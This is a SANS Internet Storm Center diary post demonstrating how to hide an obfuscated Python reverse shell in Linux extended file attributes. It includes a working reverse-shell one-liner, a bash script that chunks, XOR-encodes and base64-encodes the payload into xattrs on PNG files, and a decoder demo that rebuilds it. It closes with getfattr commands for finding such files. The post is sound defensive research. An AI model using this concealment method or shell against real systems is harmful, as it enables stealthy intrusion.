---
title: Hiding Payloads in Linux Extended File Attributes, (Thu, Jul 17th)
url: https://isc.sans.edu/diary/rss/32116
source: SANS Internet Storm Center, InfoCON: green
date: 2025-07-18
fetch_date: 2025-10-06T23:55:27.802694
---

# Hiding Payloads in Linux Extended File Attributes, (Thu, Jul 17th)

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Johannes Ullrich](/handler_list.html#johannes-ullrich "Johannes Ullrich")

Threat Level: [green](/infocon.html)

* [previous](/diary/32112)
* [next](/diary/32120)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/live-online-europe-october-2025/course/reverse-engineering-malware-advanced-code-analysis) | Online | Greenwich Mean Time | Oct 27th - Oct 31st 2025 |

# [Hiding Payloads in Linux Extended File Attributes](/forums/diary/Hiding%2BPayloads%2Bin%2BLinux%2BExtended%2BFile%2BAttributes/32116/)

**Published**: 2025-07-17. **Last Updated**: 2025-07-17 06:54:56 UTC
**by** [Xavier Mertens](/handler_list.html#xavier-mertens) (Version: 1)

[0 comment(s)](/diary/Hiding%2BPayloads%2Bin%2BLinux%2BExtended%2BFile%2BAttributes/32116/#comments)

This week, it's SANSFIRE[[1](https://www.sans.org/cyber-security-training-events/sansfire-2025/)]! I'm attending the FOR577[[2](https://www.sans.org/cyber-security-courses/linux-threat-hunting-incident-response/)] training ("Linux Incident Response & Threat Hunting"). On day 2, we covered the different filesystems and how data is organized on disk. In the Linux ecosystem, most filesystems (ext3, ext4, xfs, ...) support "extended file attributes", also called "xattr". It's a file system feature that enables users to add metadata to files. These data is not directly made available to the user and may contain anything related to the file (ex: the author's name, a brief description, ...). You may roughly compare this feature to the Alternate Data Stream (ADS) available in the Windows NTFS filesystem.

How do you use it? On Ubuntu, there is a package "attr" that contains utilities for manipulating filesystem extended attributes:

```

remnux@remnux:~/malwarezoo/xattr$ setfattr -n user.note -v "Hello ISC!" sample.txt
remnux@remnux:~/malwarezoo/xattr$ getfattr -d -n "user.note" sample.txt
# file: sample.txt
user.note="Hello ISC!"
```

Note the first part of the extended attribute: "user", called the class. Currently, they are four classes defined: security, system, trusted and user.

When reviewing extended attributes in the class, an idea popped up amongst students: "*What if we could use this storage space for malicious content?*". Challenge accepted!

After the training, I wrote a proof-of-concept that uses extended file attributes to store malicious Python code (a simple reverse shell).

First step: Let's add extended attributes to files. To make the payload more stealthy, it will be:

* split across multiple files (in chunks of x bytes)
* XOR'd with a one-byte key
* Base64 encoded

For the demo, my payload is a Python one-liner that will open a connection to the Attacker's listener (127.0.0.1:4444) and spawn a shell. I used a simple picture as base file. Each picture will receive an extended attribute "payload".

Here is the script I wrote:

```

#!/bin/bash
# Encode a payload into extended attributes

# Simple payload
PAYLOAD='import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

CHUNK_SIZE=32
CHUNKS=()
i = 0
# Split the payload in chunks of 32 bytes
while [ $((i * CHUNK_SIZE)) -lt ${#PAYLOAD} ]; do
  CHUNK=${PAYLOAD:$((i * CHUNK_SIZE)):CHUNK_SIZE}
  CHUNKS+=("$CHUNK")
  ((i++))
done

# Encoding chunks and save extended attributes
echo "Payload:"
echo $PAYLOAD
echo
echo "Chunk count: ${#CHUNKS[@]}"
for idx in "${!CHUNKS[@]}"; do
  # Duplicate a simple picture
  cp isc.png picture-$idx.png
  # XOR + Base64 encoding with the key 0xFB
  echo -n ${CHUNKS[$idx]} \
    | python3 -c "import sys; sys.stdout.buffer.write(bytes([b ^ 0xFB for b in sys.stdin.buffer.read()]))" \
    | base64 -w0 > tmp && mv tmp "picture-$idx.b64"
  echo "CHUNK$((idx + 1)) = ${CHUNK[$idx]} ($(cat picture-$idx.b64))"
  # Save the payload
  setfattr -n user.payload -v "$(cat picture-$idx.b64)" picture-$idx.png
  rm picture-$idx.b64
done
```

Results:

```

remnux@remnux:~/malwarezoo/xattr$ ./encode-payload.sh
Payload:
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);

Chunk count: 7
chunk1 = import socket,subprocess,os;s=so (kpaLlImP24iUmJCej9eIjpmLiZSYnoiI15SIwIjGiJQ=)
chunk2 = cket.socket(socket.AF_INET,socke (mJCej9WIlJiQno/TiJSYkJ6P1bq9pLK1vq/XiJSYkJ4=)
chunk3 = t.SOCK_STREAM);s.connect(("127.0 (j9WotLiwpKivqb66ttLAiNWYlJWVnpiP09PZysnM1cs=)
chunk4 = .0.1",4444));os.dup2(s.fileno(), (1cvVytnXz8/Pz9LSwJSI1Z+Oi8nTiNWdkpeelZTT0tc=)
chunk5 = 0); os.dup2(s.fileno(),1); os.du (y9LA25SI1Z+Oi8nTiNWdkpeelZTT0tfK0sDblIjVn44=)
chunk6 = p2(s.fileno(),2);p=subprocess.ca (i8nTiNWdkpeelZTT0tfJ0sCLxoiOmYuJlJieiIjVmJo=)
chunk7 = ll(["/bin/sh","-i"]); (l5fToNnUmZKV1IiT2dfZ1pLZptLA)
```

Once your payload has been stored in extended attributes, another piece of code can be used to decode them later.

I wrote a proof-of-concept[[3](https://github.com/xme/SANS-ISC/blob/master/xattr-poc.c)] in C that expect the list of files to process. For every file, the extended attribute "payload" will be extracted, Base64-decoded and XOR'd. All substrings are concatenated to rebuild the initial payload:

```

remnux@remnux:~/malwarezoo/xattr$ ./poc picture-0.png picture-1.png picture-2.png picture-3.png picture-4.png picture-5.png picture-6.png
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

Finally, if you pass this output to a Python interpreter, you get a reverse shell:

![](https://isc.sans.edu/diaryimages/images/isc-20250717-1.png)

As you can see, extended file attributes can be a very nice way to hide malicious content!

Of course, we are defenders, so the next question is how to scan a Linux system for files that have extended attributes? The getfattr command provides a "-R" option to recursively search for files:

```

remnux@remnux:~/malwarezoo$ getfattr -Rd -m- . | grep “^# file:” | cut -d “:” -f2
xattr/picture-2.png
xattr/picture-0.png
xattr/picture-5.png
xattr/picture-1.png
xattr/sample.txt
xattr/picture-3.png
xattr/picture-6.png
xattr/picture-4.png
```

If you scan your complete filesystem, you will see that this feature is intensively used by the operating system. A classic one is to store POSIX ACLs:

```

remnux@remnux:~/malwarezoo$ sudo getfattr -m- -d /var/log/journal
getfattr: Removing leading '/' from absolute path names
# file: var/log/journal
system.posix_acl_access=0sAgAAAAEABwD/////BAAFAP////8IAAUABAAAABAABQD/////IAAFAP////8=
system.posix_acl_default=0sAgAAAAEABwD/////BAAFAP////8IAAUABAAAABAABQD/////IAAFAP////8=
```

[1] <https://www.sans.org/cyber-security-training-events/sansfire-2025/>
[2] <https://www.sans.org/cyber-security-courses/linux-threat-hunting-incident-response/>
[3] <https://github.com/xme/SANS-ISC/blob/master/xattr-poc.c>

Xavier Mertens (@xme)
Xameco
Senior ISC Handler - Freelance Cyber Security Consultant
[PGP Key](https://keybase.io/xme/key.asc)

Keywords: [Extended Attributes](/tag.html?tag=Extended Attributes) [Filesystem](/tag.html?tag=Filesystem) [Linux](/tag.html?tag=Linux) [Obfuscation](/tag.html?tag=Obfuscation) [xattr](/tag.html?tag=xattr)

[0 comment(s)](/diary/Hiding%2BPayloads%2Bin%2BLinux%2BExtended%2BFile%2BAttributes/32116/#comments)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/live-online-europe-october-2025/course/reverse-engineering-malware-advanced-code-analysis) | Online | Greenwich Mean Time | Oct 27th - Oct 31st 2025 |

* [previous](/diary/32112)
* [next](/diary/32120...